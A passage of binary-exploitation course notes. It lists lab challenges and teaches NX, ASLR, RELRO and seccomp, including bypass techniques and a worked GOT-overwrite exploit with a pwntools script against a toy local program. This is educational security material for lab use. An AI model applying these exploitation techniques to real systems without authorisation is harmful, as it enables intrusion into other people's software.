find useful information in the man pages of specific functions, TL;DR:</p><ul><li><code>size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)</code> - reads <em>nmemb</em> items of data, each <em>size</em> bytes long,<ul><li>simple and straightforward</li></ul></li><li><code>char *gets(char *s)</code> - reads until either a terminating newline or EOF, which it replaces with a null byte (&rsquo;\0')<ul><li>the problem here is that you won&rsquo;t be able to have a newline in the middle of your payload; note that it doesn&rsquo;t have a size argument to it will read indefinetely as long as it doesn&rsquo;t reach a newline or EOF</li></ul></li><li><code>char *fgets(char *s, int size, FILE *stream)</code> - reads in <strong>at most</strong> one less than <em>size</em> characters from stream and stores them into the buffer pointed to by s. Reading stops after an <strong>EOF</strong> or a <strong>newline</strong>. If a <strong>newline</strong> is read, it is stored into the buffer. A terminating null byte (&rsquo;\0&rsquo;) is stored after the last character in the buffer.<ul><li>this one adds the size limit argument, but also note that it <strong>stores</strong> the newline in the string and <strong>adds</strong> the null byte after (in contrast to <code>gets</code>)</li></ul></li><li><code>int scanf(const char *format, ...)</code> - as opposed the other funcions <code>scanf</code> reads <strong>text</strong> based on the format string and parses it<ul><li>don&rsquo;t do the common mistake of <strong>sending binary data to scanf</strong>, for example <code>"%d"</code> expects a string representation of a numer like <code>"16"</code>, not the binary data like <code>"\x00\x00\x00\x10"</code></li></ul></li></ul><blockquote><p>Every time you encounter a new input function check the documentation to find it&rsquo;s limitations</p></blockquote><h1 id=challenges>Challenges</h1><h2 id=01-challenge-parrot>01. Challenge: Parrot</h2><p>Some programs feature a stack <em>smashing protection</em> in the form of stack canaries, that is, values kept on the stack which are checked before returning from a function. If the value has changed, then the “canary” can conclude that stack data has been corrupted throughout the execution of the current function.</p><p>We have implemented our very own <code>parrot</code>. Can you avoid it somehow?</p><h2 id=02-challenge-indexing>02. Challenge: Indexing</h2><p>More complex programs require some form of protocol or user interaction. This is where <em>pwntools</em> shines.
Here&rsquo;s an interactive script to get you started:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>from</span> <span style=color:#000>pwn</span> <span style=color:#204a87;font-weight:700>import</span> <span style=color:#ce5c00;font-weight:700>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#000>p</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>process</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;./indexing&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#000>p</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>recvuntil</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;Index: &#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>    <span style=color:#000>p</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>sendline</span><span style=color:#000;font-weight:700>()</span> <span style=color:#8f5902;font-style:italic># TODO (must be string)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic># Give value</span>
</span></span><span style=display:flex><span>    <span style=color:#000>p</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>recvuntil</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;Value: &#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>    <span style=color:#000>p</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>sendline</span><span style=color:#000;font-weight:700>()</span> <span style=color:#8f5902;font-style:italic># TODO (must be string)</span>
</span></span><span style=display:flex><span>    <span style=color:#000>p</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>interactive</span><span style=color:#000;font-weight:700>()</span>
</span></span></code></pre></div><blockquote><p>Go through GDB when aiming to solve this challenge. As all input values are strings, you can input them at the keyboard and follow their effect in GDB.</p></blockquote><h2 id=03-challenge-smashthestack-level7>03. Challenge: Smashthestack Level7</h2><p>Now you can tackle a real challenge. See if you can figure out how you can get a shell from this one.</p><blockquote><p>Hints:</p></blockquote><blockquote><p>There&rsquo;s an integer overflow + buffer overflow in the program.</p></blockquote><blockquote><p>How does integer multiplication work at a low level? Can you get get a positive number by multiplying a negative number by 4?</p></blockquote><blockquote><p>To pass command line arguments in gdb use <code>run arg1 arg2 ...</code> or <code>set args arg1 arg2 ...</code> before a <code>run</code> command</p></blockquote><blockquote><p>In <em>pwntools</em> you can pass a list to <code>process</code> (<code>process(['./level07', arg1, arg2]</code>)</p></blockquote><h2 id=04-challenge-neighbourly>04. Challenge: Neighbourly</h2><p>Let&rsquo;s overwrite a structure&rsquo;s function pointer using a buffer overflow in its vicinity. The principle is the same.</p><h2 id=05-challenge-input-functions>05. Challenge: Input Functions</h2><p>On the same idea as the <em>Indexing</em> challenge but much harder. Carefully check what input functions are used and parse the input accordingly.</p><h2 id=06-challenge-bonus-birds>06. Challenge: Bonus: Birds</h2><p>Time for a more complex challenge. Be patient and don&rsquo;t speed through it.</p><h1 id=further-reading>Further Reading</h1><p><a href=https://en.wikipedia.org/wiki/De_Bruijn_sequence>De Bruijin sequences</a></p><p><a href=https://docs.pwntools.com/en/latest/elf/elf.html>PwnTools ELF Module</a> (which internally uses <a href=https://github.com/eliben/pyelftools>PyElftoools</a> and may expose such objects)</p><p><a href=https://docs.pwntools.com/en/stable/tubes.html>PwnTools IO</a></p></div><div class=td-content style=page-break-before:always><h1 id=pg-eaa30ce9d3ce94ffdd9669127b5fb173>2 -</h1><h1 id=defense-mechanisms>Defense Mechanisms</h1><h2 id=introduction>Introduction</h2><p>The previous sessions (<a href=../shellcodes/>Shellcodes</a> and <a href=../shellcodes-advanced/>Shellcodes Advanced</a>) presented an exploitation scenario that is based on the assumption that machine instructions can be executed from <strong>any</strong> memory segment belonging to the process. As you can recall from the <a href=../executable-file-formats/>Executable File Formats</a> session, different sections of an ELF binary are grouped into segments which are loaded into memory when the binary is being executed. This mechanism (and some hardware support) enables 2 important protection mechanisms that will be presented in this session:</p><ul><li>Executable Space Protection: only certain parts of the address space exhibit the code execution right;</li><li>Address Space Layout Randomization (ASLR): certain parts of the address space get mapped at random locations.</li></ul><p>In the <a href=../return-oriented-prgramming>Return Oriented Programming</a> session we discussed how the <strong>PLT</strong>/<strong>GOT</strong> work in relation to resolving addresses of functions from dynamically liked libraries. We also learned how to abuse this process and trigger arbitrary code execution by <strong>corrupting GOT entries</strong>. We will take this exploit primitive to the next level and explore how it can be used when additional defense mechanisms are in use.</p><p>Next, we will introduce the <strong>RELRO</strong> mitigation, which is designed to preclude the overwriting of relocation sections such as the GOT.</p><p>Another defense mechanism we will discuss is <strong>seccomp</strong>, which enables applications to enforce restrictions on the system calls performed in the process and child processes, thereby creating a sandbox.</p><p>Besides presenting these mechanisms, we are also going to take a quick look at how can we bypass them. Since these protections are ubiquitous at this time, you will have to work around them almost every time you build a binary exploit.</p><p><strong>IMPORTANT:</strong> The tasks today are designed for 32 bit executables. Make sure you compile with the <code>-m32</code> flag for <code>gcc</code>. The binaries in the tasks archive are already compiled as such.</p><h2 id=tutorials>Tutorials</h2><p>The tutorials will showcase the tools used to inspect the defense mechanisms.</p><h3 id=general-defense-mechanisms-check>General Defense Mechanisms Check</h3><p>The <code>checksec</code> command-line tool is a wrapper over the functionality implemented in pwntools&rsquo; <code>pwnlib.elf.elf</code> module.</p><p>To get it to work in the Kali VM, you have to update pwntools to the latest version using <code>pip3 install -U pwntools</code>.</p><p>We will use this tool throughout the session to identify which defense mechanisms are enabled for a certain binary:</p><pre tabindex=0><code>root@kali:~/demo/nx# checksec ./no_nx
[*] &#39;/root/demo/nx/no_nx&#39;
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
</code></pre><h3 id=executable-space-protection>Executable Space Protection</h3><p>The <code>executable space protection</code> is an instance of the <code>principle of least privilege</code>, which is applied in many security sensitive domains. In this case, the executable space protection is used to limit the types of memory access that a process is allowed to make during execution. A memory region (i.e. page) can have the following protection levels: <strong>READ</strong>, <strong>WRITE</strong> and <strong>EXECUTE</strong>. The executable space protection mechanism mandates that writable regions should not be executable at the same time. This prevents code injection.</p><p>The mechanism can be (and was) implemented in many different ways, the most common in Linux being:</p><ul><li><strong>NX bit</strong>: This is the easiest method, and involves an extra bit added to each page table entry that specifies if the memory page should be executable or not. This is the current implementation in 64-bit processors where page table entries are 8-bytes wide.</li><li><strong>Physical Address Extension (PAE)</strong>: Besides the main feature that allows access to more than 4GB of memory, the PAE extension for 32-bit processor also adds a NX bit in its page table entries.</li><li><strong>Emulation</strong>: The NX bit can be emulated on older (i.e., non-PAE) 32-bit processors by overloading the Supervisor bit (<a href=https://en.wikipedia.org/wiki/PaX#PAGEEXEC>PaX PAGEEXEC</a>), or by using the segmentation mechanism and splitting the address space in half (<a href=https://en.wikipedia.org/wiki/PaX#SEGMEXEC>PaX SEGMEXEC</a>).</li></ul><p>This security feature gets in the way of <strong>just-in-time (JIT)</strong> compilers, which need to produce and write code at runtime, and that is later executed. Since a JIT compiler cannot run in this kind of secured environment, an application using it is vulnerable to attacks known as <strong>JIT spraying</strong>. The idea was first presented by Dion Blazakis, and is, briefly, a way to force the JIT compiler to produce shellcode.</p><ul><li>Slides: <a href=http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf>Black Hat & DEF CON 2010</a>;</li><li>Paper: <a href=http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf>Interpreter Exploitation. Pointer Inference and JIT Spraying</a>.</li></ul><p>There are of course other implementations in different hardening-oriented projects such as: OpenBSD <a href="https://marc.info/?l=openbsd-misc&m=105056000801065">W^X</a>, Red Hat <a href="https://marc.info/?l=openbsd-misc&m=105056000801065">Exec Shield</a>, PaX (which is now part of <a href=https://grsecurity.net/>grsecurity</a>), Windows Data Execution Prevention (<a href=https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention>DEP</a>).</p><h3 id=memory-segments-permissions-walkthrough>Memory Segments Permissions Walkthrough</h3><p>The Linux kernel provides support for managing memory protections using the <code>mmap()</code> and <code>mprotect()</code> syscalls. Simply put, what they do is:</p><ul><li><code>mmap()</code>: requests the OS to create a mapping (allocate space) inside the address space of the calling process. See <a href=https://stackoverflow.com/questions/3642021/what-does-mmap-do>this answer</a>;</li><li><code>mprotect()</code>: requests the OS to set permissions over a memory region (e.g. <code>PROT_READ</code>, <code>PROT_WRITE</code>, <code>PROT_EXEC</code> and others).</li></ul><p>These syscalls are used by the loader to set protection levels for each segment it loads when running a binary. Of course, the same functions can also be used during execution.</p><p>PaX has a protection option that restricts the use of <code>mprotect()</code> and <code>mmap()</code> to avoid resetting the permissions during execution. See <a href=https://pax.grsecurity.net/docs/mprotect.txt>MPROTECT</a>. Note that grsecurity/PaX are patches to the kernel, and are not available in normal distributions. You have to compile your own kernel if you want to try them out.</p><p>Let&rsquo;s start by deactivating ASLR, which is going to be discussed in the following section of this tutorial, and only focus on the NX protection. We can do this in two ways, as told below.</p><ul><li>To disable ASLR system-wide we use (root access is required): <code>sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'</code>;</li><li>To create a shell with ASLR disabled (ASLR will also be disabled for future processes spawned from that shell), we use (root access is not required): <code>setarch $(uname -m) -R /bin/bash</code>.</li></ul><p>After disabling ASLR, let&rsquo;s compile an extremely simple C application. Save the following code as <code>hello.c</code>:</p><pre tabindex=0><code>int main() {
    while (1);
}
</code></pre><p>Make sure you have both <code>build-essential</code> and <code>gcc-multilib</code> packages installed before going further (run <code>sudo apt install build-essential gcc-multilib</code> on Debian-based systems).</p><p>Compile the <code>hello.c</code> code using <code>CFLAGS='-m32 -O0' make hello</code>. The result should be a <code>hello</code> binary.</p><p>As presented in the <code>Static Analysis</code> session, the ELF format contains flags for each segment that specify what permissions should be granted. You can use <code>readelf -l hello</code> to dump all program headers for this binary. The result should be similar to:</p><pre tabindex=0><code>Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x00568 0x00568 R E 0x1000
  LOAD           0x000f08 0x08049f08 0x08049f08 0x00114 0x00118 RW  0x1000
  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x000490 0x08048490 0x08048490 0x0002c 0x0002c R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame 
   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 
   04     .dynamic 
   05     .note.ABI-tag .note.gnu.build-id 
   06     .eh_frame_hdr 
   07     
   08     .init_array .fini_array .jcr .dynamic .got
</code></pre><p>Check the <code>Flg</code> column. For example, the first <code>LOAD</code> segment contains <code>.text</code> and is marked <code>R E</code>, while the <code>GNU_STACK</code> segment is marked <code>RW </code>.</p><p>Next we are interested in seeing calls to <code>mmap2()</code> and <code>mprotect()</code> made by the loader. We are going to use the <code>strace</code> tool for this, and directly execute the loader. You can check the path to the loader on your system using <code>ldd hello</code>.</p><pre tabindex=0><code>$ strace -e mmap2,mprotect /lib/ld-linux.so.2 ./hello
</code></pre><p>The output should be similar to:</p><pre tabindex=0><code>[ Process PID=11198 runs in 32 bit mode. ]
mmap2(0x8048000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0x8048000
mmap2(0x8049000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0x8049000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7ffc000
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7ffa000
mmap2(NULL, 156324, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffffffff7fd3000
mmap2(NULL, 1763964, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffffffff7e24000
mmap2(0xf7fcd000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a9000) = 0xfffffffff7fcd000
mmap2(0xf7fd0000, 10876, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd0000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7e23000
mprotect(0xf7fcd000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x56575000, 4096, PROT_READ)   = 0
</code></pre><p>We can observe a <code>PROT_READ|PROT_EXEC</code> mapping at address <code>0x8048000</code>, followed by a <code>PROT_READ|PROT_WRITE</code> at address <code>0x8049000</code> that is later changed to <code>PROT_READ</code> for the first half (4096 bytes). The later allocation is the data segment, that should be writable. We can also see a bunch of allocations for segments belonging to dynamic libraries.</p><p>Note that the <strong>stack</strong> is not explicitly allocated by the loader. The kernel will keep increasing it each time a page fault is triggered without calling <code>mmap</code>. Also, the <strong>heap</strong> will be extended on-demand as the application requires it.</p><p>We can dump all memory mappings of the running process as follows:</p><pre tabindex=0><code>$ ps u | grep /lib/ld-linux.so.2 
... # get the PID of the loader process from this output, let&#39;s assume it is 11198
$ cat /proc/11198/maps
</code></pre><p>Make sure to use the PID of the loader process, and not the <code>strace</code> process.</p><p>The output of the last <code>cat</code> command should be similar to:</p><pre tabindex=0><code>08048000-08049000 r-xp 00000000 00:22 5769082                            /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello
08049000-0804a000 r--p 00000000 00:22 5769082                            /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello
0804a000-0804b000 rw-p 00001000 00:22 5769082                            /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello
56555000-56575000 r-xp 00000000 08:05 827365                             /lib/i386-linux-gnu/ld-2.19.so
56575000-56576000 r--p 0001f000 08:05 827365                             /lib/i386-linux-gnu/ld-2.19.so
56576000-56577000 rw-p 00020000 08:05 827365                             /lib/i386-linux-gnu/ld-2.19.so
f7e23000-f7e24000 rw-p 00000000 00:00 0 
f7e24000-f7fcd000 r-xp 00000000 08:05 823395                             /lib/i386-linux-gnu/libc-2.19.so
f7fcd000-f7fcf000 r--p 001a9000 08:05 823395                             /lib/i386-linux-gnu/libc-2.19.so
f7fcf000-f7fd0000 rw-p 001ab000 08:05 823395                             /lib/i386-linux-gnu/libc-2.19.so
f7fd0000-f7fd3000 rw-p 00000000 00:00 0 
f7ffa000-f7ffd000 rw-p 00000000 00:00 0 
f7ffd000-f7ffe000 r-xp 00000000 00:00 0                                  [vdso]
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
</code></pre><h3 id=ways-of-bypassing-nx>Ways of Bypassing NX</h3><p>Below are a few methods of exploiting a binary that has <strong>NX</strong> enabled:</p><ul><li><strong>ret-to-plt/libc</strong>. You can return to the <code>.plt</code> section and call library function already linked. You can also call other library functions based on their known offsets. The latter approach assumes no ASLR (see next section), or the possibility of an information leak.</li><li><strong>mprotect()</strong>. If the application is using <code>mprotect()</code> you can easily call it to modify the permissions and include <code>PROT_EXEC</code> for the stack. You can also call this in a <code>ret-to-libc</code> attack. You can also <code>mmap</code> a completely new memory region and dump the shellcode there.</li><li><strong>Return Oriented Programming (ROP)</strong>. This is a generalization of the <code>ret-to-*</code> approach that makes use of existing code to execute almost anything. As this is probably one of the most common types of attacks, it will be discussed in depth in a future section.</li></ul><h3 id=address-space-layout-randomization>Address Space Layout Randomization</h3><p><strong>Address Space Layout Randomization (ASLR)</strong> is a security feature that maps different memory regions of an executable at random addresses. This prevents buffer overflow-based attacks that rely on known addresses such as the stack (for calling into shellcode), or dynamically linked libraries (for calling functions that were not already linked with the target binary). Usually, the sections that are randomly mapped are: the stack, the heap, the VDSO page, and the dynamic libraries. The code section can also be randomly mapped for <a href=https://en.wikipedia.org/wiki/Position-independent_code#PIE>PIE</a> binaries.</p><p>Linux allows 3 options for its ASLR implementation that can be configured using the <code>/proc/sys/kernel/randomize_va_space</code> file. Writing <strong>0</strong>, <strong>1</strong> or <strong>2</strong> to this will results in the following behaviors:</p><ul><li><strong>0</strong>: deactivated;</li><li><strong>1</strong>: random stack, vdso, libraries; heap is after code section; random code section (only for PIE-linked binaries);</li><li><strong>2</strong>: random heap too.</li></ul><p>Make sure you reactivate ASLR after the previous section of the tutorial, by one of the two options below.</p><p>If you disabled ASLR system-wide, re-enable it using (root access is required):</p><pre tabindex=0><code>$ sudo bash -c &#39;echo 2 &gt; /proc/sys/kernel/randomize_va_space&#39;
</code></pre><p>If you disabled ASLR at shell level, simply <strong>close the shell</strong> such as issuing the <code>Ctrl+d</code> keyboard shortcut.</p><p>We can easily demonstrate the effects of ASLR on shared libraries by running <code>ldd</code> multiple times in a row on a binary such as <code>/bin/ls</code>.</p><p>In GDB, ASLR is disabled by default in order to reduce the non-determinism and make debugging easier. However, when developing exploits we will sometimes want to test them in conjunction with ASLR. To enable ASLR in GDB, use the following command:</p><pre tabindex=0><code>pwndbg&gt; set disable-randomization off
</code></pre><h3 id=ways-of-bypassing-aslr>Ways of Bypassing ASLR</h3><p>Below are a few methods of exploiting a binary that has <strong>ASLR</strong> enabled:</p><ul><li><strong>Bruteforce</strong>. If you are able to inject payloads multiple times without crashing the application, you can bruteforce the address you are interested in (e.g., a target in libc). Otherwise, you can just run the exploit multiple times. Another thing to keep in mind is that, as addresses are randomized at load-time, child processes spawned with fork inherit the memory layout of the parent. Take the following scenario: we interact with a vulnerable sever that handles connections by forking to another process. We manage to obtain a leak from a child process but we are not able to create an exploit chain that leads to arbitrary code execution. However, we may still be able to use this leak in another connection, since the new process will have the same address space as the previous.</li><li><strong>NOP sled</strong>. In the case of shellcodes, a longer NOP sled will maximize the chances of jumping inside it and eventually reaching the exploit code even if the stack address is randomized. This is not very useful when we are interested in jumping to libc or other functions, which is usually the case if the executable space protection is also active.</li><li><strong>jmp esp</strong>. This will basically jump into the stack, no matter where it is mapped. It&rsquo;s actually a very rudimentary form of Return Oriented Programming which was discussed in the previous session.</li><li><strong>Restrict entropy</strong>. There are various ways of reducing the entropy of the randomized address. For example, you can decrease the initial stack size by setting a huge amount of dummy environment variables.</li><li><strong>Partial overwrite</strong>. This technique is useful when we are able to overwrite only the least significant byte(s) of an address (e.g. a GOT entry). We must take into account the offsets of the original and final addresses from the beginning of the mapping. If these offsets only differ in the last 8 bits, the exploit is deterministic, as the base of the mapping is aligned to 0x1000. The offsets of <code>read</code> and <code>write</code> in <code>libc6_2.27-3ubuntu1.2_i386</code> are suitable for a partial overwrite:</li></ul><pre tabindex=0><code>pwndbg&gt; p read
$1 = {&lt;text variable, no debug info&gt;} 0xe6dd0 &lt;__GI___libc_read&gt;
pwndbg&gt; p write
$2 = {&lt;text variable, no debug info&gt;} 0xe6ea0 &lt;__GI___libc_write&gt;
</code></pre><p>However, since bits 12-16 of the offsets differ, the corresponding bits in the full addresses would have to be bruteforced (probability 1/4).</p><ul><li><strong>Information leak</strong>. The most effective way of bypassing ASLR is by using an information leak vulnerability that exposes randomized address, or at least parts of them. You can also dump parts of libraries (e.g. <code>libc</code>) if you are able to create an exploit that reads them. This is useful in remote attacks to infer the version of the library, downloading it from the web, and thus knowing the right offsets for other functions (not originally linked with the binary).</li></ul><h3 id=chaining-information-leaks-with-got-overwrite>Chaining Information Leaks with GOT Overwrite</h3><p>In this tutorial we will exploit a program that is similar to the <code>no-ret-control</code> challenge from a previous session:</p><pre tabindex=0><code>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
 
int main() {
	int *addr;
 
	printf(&#34;Here&#39;s a libc address: 0x%08x\n&#34;, printf);
 
	printf(&#34;Give me and address to modify!\n&#34;);
	scanf(&#34;%p&#34;, &amp;addr);
 
	printf(&#34;Give me a value!\n&#34;);
	scanf(&#34;%u&#34;, addr);
 
	sleep(10);
 
	printf(&#34;Abandon all hope ye who reach this...\n&#34;);	
}
</code></pre><p>The goal is to alter the execution flow and avoid reaching the final <code>printf</code>. To this end, we will overwrite the <code>sleep</code> entry in GOT and redirect it to <code>exit</code>. However, due to ASLR, the value can not be hardcoded and must be computed at runtime.</p><p>Whenever we operate with addresses belonging to shared libraries, we must be aware that the offsets are highly dependent on the particular build of the library. We can identify this build either by its BuildID (retrieved with the file command), or by its version string:</p><pre tabindex=0><code>silvia@imladris:/sss/demo$ ldd ./got_overwrite
    linux-gate.so.1 (0xf7ee8000)
    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7ccc000)
    /lib/ld-linux.so.2 (0xf7ee9000)
silvia@imladris:/sss/demo$ file $(realpath /lib/i386-linux-gnu/libc.so.6)
/lib/i386-linux-gnu/libc-2.27.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=cf1599aa8b3cb35f79dcaea7a8b48704ecf42a19, for GNU/Linux 3.2.0, stripped
silvia@imladris:/sss/demo$ strings /lib/i386-linux-gnu/libc.so.6 | grep &#34;GLIBC &#34;
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
</code></pre><p>Alternatively, if we don&rsquo;t have prior knowledge of the remote system where the binary runs, but obtain via an information leak some addresses, we may be able to identify the libc based on the last 3 nibbles (a nibble is a group of 4 bits) of these addresses:</p><pre tabindex=0><code>0xf7df6250 &lt;__libc_system&gt;
0xf7e780e0 &lt;__sleep&gt;
</code></pre><p>The least significant 3 nibbles of the above addresses are <code>250</code> and <code>0e0</code>, respectively.</p><p>We enter them in the <a href=https://libc.blukat.me/>libc database</a> and get a match for the same <code>libc</code> build we determined earlier.</p><p>For this <code>libc</code>, we obtain the offsets of the functions we are interested in using GDB:</p><pre tabindex=0><code>silvia@imladris:/sss/demo$ gdb -q -n /lib/i386-linux-gnu/libc.so.6
(gdb) p printf
$1 = {&lt;text variable, no debug info&gt;} 0x513a0 &lt;__printf&gt;
(gdb) p exit
$2 = {&lt;text variable, no debug info&gt;} 0x30420 &lt;__GI_exit&gt;
</code></pre><p>We will also need the address of <code>sleep@got</code> (which is static because the binary is not position independent):</p><pre tabindex=0><code>silvia@imladris:/sss/demo$ objdump -d -M intel -j .plt ./got_overwrite | grep &#34;sleep@plt&#34; -A1
080483b0 &lt;sleep@plt&gt;:
 80483b0:   ff 25 0c a0 04 08       jmp    DWORD PTR ds:0x804a00c
</code></pre><p>We start the program and compute the address of exit based on the leak of printf (in another terminal):</p><pre tabindex=0><code>&gt;&gt;&gt; printf_offset = 0x513a0
&gt;&gt;&gt; exit_offset = 0x30420
&gt;&gt;&gt; 0xf7dfb3a0 - printf_offset + exit_offset
4158497824
</code></pre><pre tabindex=0><code>silvia@imladris:/sss/demo$ ./got_overwrite
Here&#39;s a libc address: 0xf7dfb3a0
Give me and address to modify!
0x804a00c
Give me a value!
4158497824
silvia@imladris:/sss/demo$ echo $?
10
</code></pre><p>As we intended, the <code>GOT</code> entry corresponding to <code>sleep</code> was overwritten by exit and the program exited with code 10 without printing the final message.</p><p>The following pwntools script automates this interaction:</p><pre tabindex=0><code>from pwn import *
 
p = process(&#39;./got_overwrite&#39;)
libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
 
sleep_got = p.elf.got[&#39;sleep&#39;]
 
p.recvuntil(&#39;libc address:&#39;)
libc_leak = int(p.recvuntil(&#39;\n&#39;)[:-1], 16)
libc_base = libc_leak - libc.symbols[&#39;printf&#39;]
 
print(&#34;Libc base is at: 0x%x&#34; % libc_base)
 
exit = libc_base + libc.symbols[&#39;exit&#39;]
 
p.sendline(hex(sleep_got))
 
p.recvuntil(&#39;value!&#39;)
p.sendline(str(exit))
 
p.interactive()
</code></pre><h3 id=relro>RELRO</h3><p><strong>RELRO</strong> (<strong>Rel</strong>ocation <strong>R</strong>ead-<strong>O</strong>nly) defends against attacks which overwrite data in relocation sections, such as the <strong>GOT overwrite</strong> we showed earlier.</p><p>It comes in two flavors:</p><ul><li><strong>Partial</strong>. Protects the <code>.init_array</code>, <code>.fini_array</code>, <code>.dynamic</code> and <code>.got</code> sections (but NOT <code>.got.plt</code>);</li><li><strong>Full</strong>. Additionally protects <code>.got.plt</code>, rendering the <strong>GOT overwrite</strong> attack infeasible.</li></ul><p>In a previous session we explained how the addresses of dynamically linked functions are resolved using lazy binding. When Full RELRO is in effect, the addresses are resolved at load-time and then marked as read-only. Due to the way address space protection works, this means that the <code>.got</code> resides in the read-only mapping, instead of the read-write mapping that contains the <code>.bss</code>.</p><p>This is not a game-over in terms of exploitation, as other overwriteable code pointers often exist. These can be specific to the application we want to exploit or reside in shared libraries (for example: the GOT of shared libraries that are not compiled with RELRO). The return addresses on the stack are still viable targets.</p><h3 id=seccomp>seccomp</h3><p><strong>Seccomp</strong> is a mechanism though which an application may transition into a state where the system calls it performs are restricted. The policy, which may act on a whitelist or blacklist model, is described using <a href=https://lwn.net/Articles/593476/>eBPF</a>.</p><p><strong>Seccomp</strong> filters are instated using the <code>prctl</code> syscall (<code>PR_SET_SECCOMP</code>). Once it is in effect, the application will be effectively sandboxed and the restrictions will be inherited by child processes.</p><p>This may severely limit our exploitation prospects in some cases. In the challenges that we have solved during these sessions, a common goal was spawning a shell and retrieving a certain file (the flag). If the exploited binary used a seccomp filter that disallowed the <code>execve</code> syscall (used by the <code>system</code> library function), this would have thwarted our exploit.</p><p>The <a href=https://github.com/david942j/seccomp-tools>seccomp-tools</a> suite provides tools for analyzing seccomp filters. The <code>dump</code> subcommand may be used to extract the filter from a binary at runtime and display it in a pseudocode format:</p><pre tabindex=0><code>silvia@imladris:/sss/demo$ seccomp-tools dump ./seccomp_example
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
